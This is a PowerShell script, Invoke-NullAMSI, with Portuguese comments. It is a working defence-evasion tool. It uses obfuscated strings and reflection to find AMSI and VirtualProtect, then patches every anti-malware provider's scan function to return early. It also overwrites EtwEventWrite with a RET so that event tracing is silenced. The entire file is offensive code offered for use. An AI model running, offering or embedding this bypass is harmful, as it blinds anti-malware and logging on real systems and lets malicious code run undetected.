function Invoke-NullAMSI {
    param
    (
        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $v
    )

    # Inicializa automaticamente o parâmetro -etw como $true
    $etw = $true

    # Verbose 
    if ($v) {
        $VerbosePreference = "Continue"
    }

    ### Função baseada por Matt Graeber, Twitter: @mattifestation ###
    
    # Obtendo o endereço de uma função Winapi usando funções nativas com Reflection
    function Get-Function
    {
        Param(
            [string] $module,
            [string] $function
        )
        $moduleHandle = $GetModule.Invoke($null, @($module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
    }

    # Obter um delegate para poder chamar funções Winapi com seu endereço
    function Get-Delegate
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
            [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
            [Parameter(Position = 2)] [Type] $retType = [Void]
        )
        $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('QM', $false).
        DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
        $delegate = $type.CreateType()
        $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
    }

    Write-host "[*] Patching 4MSI" -ForegroundColor Cyan
    # Adicionar a assembly WinForms necessária
    try {
        Add-Type -AssemblyName System.Windows.Forms
    }
    catch {
        Throw "[!] Failed to add WinForms assembly"
    }

    $marshalClass = [System.Runtime.InteropServices.Marshal]

    # Obter métodos nativos
    $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')

    # Strings "ofuscadas" em bytes ASCII
    $bytesGetProc = [Byte[]](0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73)
    $bytesGetMod =  [Byte[]](0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65)

    # Obter strings a partir de bytes ASCII
    $GetProc = [System.Text.Encoding]::ASCII.GetString($bytesGetProc)
    $GetMod = [System.Text.Encoding]::ASCII.GetString($bytesGetMod)

    # Obter o endereço de GetModule usando métodos nativos
    $GetModule = $unsafeMethodsType.GetMethod($GetMod)
    if ($GetModule -eq $null) {
        Throw "[!] Error getting the $GetMod address"
    }
    Write-Verbose "[*] Handle of ${GetMod}: $($GetModule.MethodHandle.Value)"

    # Obter o endereço de GetAddres usando métodos nativos
    $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
    if ($GetAddres -eq $null) {
        Throw "[!] Error getting the $GetProc address"
    }
    Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"

    # "Mesma" técnica usada acima
    $bytes4msiInit = [Byte[]](0x41, 0x6D, 0x73, 0x69, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65)
    $bytes4msi = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)

    # Obter o respectivo endereço de 4msi
    $4msiAddr = Get-Function $4msi $4msiInit
    if ($4msiAddr -eq $null) {
        Throw "[!] Error getting the $4msiInit address"
    }
    Write-Verbose "[*] Handle of ${4msiInit}: $4msiAddr"

    ### Método de patch baseado por Maor Korkos (@maorkor) ###

    Write-Verbose "[*] Getting $4msiInit delegate"

    # Obtemos o tamanho em bytes de IntPtr. Com isso, definiremos variáveis dependendo se o nosso PowerShell é de 32 ou 64 bits.
    # Para 64 bits, IntPtr geralmente tem 8 bytes de comprimento.
    # Para 32 bits, IntPtr geralmente tem 4 bytes de comprimento.
    $PtrSize = $marshalClass::SizeOf([Type][IntPtr])
    if ($PtrSize -eq 8) {
        $Initialize = Get-Delegate $4msiAddr @([string], [UInt64].MakeByRefType()) ([Int])
        [Int64]$ctx = 0
    } else {
        $Initialize = Get-Delegate $4msiAddr @([string], [IntPtr].MakeByRefType()) ([Int])
        $ctx = 0
    }

    # Um pouco de ofuscação
    $replace = 'Virt' + 'ualProtec'
    $name = '{0}{1}' -f $replace, 't'

    # Obter o endereço de VtProtect
    $protectAddr = Get-Function ("ker{0}.dll" -f "nel32") $name
    if ($protectAddr -eq $null) {
        Throw "[!] Error getting the $name address"
    }
    Write-Verbose "[*] Handle of ${name}: $protectAddr"

    # Obtemos seu delegate para poder “invocar” ou “chamar” a função
    $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    Write-Verbose "[*] Getting $name delegate"

    # Declara variáveis
    $PAGE_EXECUTE_WRITECOPY = 0x00000080
    $patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
    $p = 0; $i = 0

    Write-Verbose "[*] Calling $4msiInit to recieve a new AMS1 Context"
    if ($Initialize.Invoke("Scanner", [ref]$ctx) -ne 0) {
        if ($ctx -eq 0) {
            Write-Host "[!] No provider found" -ForegroundColor Red
            return
        } else {
            Throw "[!] Error call $4msiInit"
        }
    }
    Write-host "[*] AMS1 context: $ctx" -ForegroundColor Cyan

    # Encontra a lista de AntiMalwareProviders em CAmsiAntimalware
    if ($PtrSize -eq 8) {
        $CAmsiAntimalware = $marshalClass::ReadInt64([IntPtr]$ctx, 16)
        $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
    } else {
        $CAmsiAntimalware = $marshalClass::ReadInt32($ctx+8)
        $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36)
    }

    # Loop pelos providers
    Write-Verbose "[*] Patching all the providers"
    while ($AntimalwareProvider -ne 0)
    {

        # Encontrar a função Scan do provider de acordo com a arquitetura do Powershell
        if ($PtrSize -eq 8) {
            $AntimalwareProviderVtbl = $marshalClass::ReadInt64([IntPtr]$AntimalwareProvider)
            $AmsiProviderScanFunc = $marshalClass::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
        } else {
            $AntimalwareProviderVtbl = $marshalClass::ReadInt32($AntimalwareProvider)
            $AmsiProviderScanFunc = $marshalClass::ReadInt32($AntimalwareProviderVtbl + 12)
        }

        # Mudamos a proteção para poder aplicar o patch
        Write-Verbose "[*] Changing address $AmsiProviderScanFunc permissions to PAGE_EXECUTE_WRITECOPY"
        Write-host "[$i] Provider's scan function found: $AmsiProviderScanFunc" -ForegroundColor Cyan
        if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
            Throw "[!] Error changing the permissions of provider: $AmsiProviderScanFunc"
        }

        # Copiar os bytes do patch para a função respectiva
        try {
            $marshalClass::Copy($patch, 0, [IntPtr]$AmsiProviderScanFunc, 6)
        }
        catch {
            Throw "[!] Error writing patch in address:  $AmsiProviderScanFunc"
        }

        # Verificar se a função tem os bytes do patch
        for ($x = 0; $x -lt $patch.Length; $x++) {
            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($AmsiProviderScanFunc, $x))
            if ($byteValue -ne $patch[$x]) {
                Throw "[!] Error when patching in the address: $AmsiProviderScanFunc"
            }
        }

        Write-Verbose "[*] Restoring original memory protection"
        if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $p, [ref]$p)) {
            Throw "[!] Failed to restore memory protection of provider: $AmsiProviderScanFunc"
        }

        $i++

        # Obtemos o próximo provider, se existir
        if ($PtrSize -eq 8) {
            $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$PtrSize))
        } else {
            $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36 + ($i*$PtrSize))
        }
    }

    if ($etw) {
        # Mesma metodologia que para o bypass 4MSI
        Write-host "[*] Patching ETW" -ForegroundColor Cyan
        $etwFunc = [System.Text.Encoding]::ASCII.GetString([Byte[]](0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65))

        $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
        Write-Verbose "[*] Handle of ${etwFunc}: $etwAddr"
        if ($etwAddr -eq $null) {
            Throw "[!] Error getting the $etwFunc address"
        }

        Write-Verbose "[*] Changing $etwFunc permissions to PAGE_EXECUTE_WRITECOPY"
        if (!$protect.Invoke($etwAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
            Throw "[!] Error changing the permissions $etwFunc"
        }

        try {
            # RET patch, a função quando chamada apenas retorna
            if ($PtrSize -eq 8) {
                $marshalClass::WriteByte($etwAddr, 0xC3)
            } else {
                $patch = [byte[]] (0xb8, 0xff, 0x55)
                $marshalClass::Copy($patch, 0, [IntPtr]$etwAddr, 3)
            }
        }
        catch {
             Throw "[!] Error writing patch $etwFunc"
        }
        
        Write-Verbose "[*] Restoring original memory protection"
        if (!$protect.Invoke($etwAddr, 1, $p, [ref]$p)) {
            Throw "[!] Failed to restore memory protection of $etwFunc"
        }
        if ($PtrSize -eq 8) {
            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, 0))
            if ($byteValue -ne 0xc3) {
                Throw "[!] Error when patching $etwFunc"
            }
        } else {
            for ($x = 0; $x -lt 3; $x++) {
                $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, $x))
                if ($byteValue -ne $patch[$x]) {
                    Throw "[!] Error when patching $etwFunc"
            }
        }
        }

        Write-Host "[*] Successful ETW patching" -ForegroundColor Green
    }

    Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
}
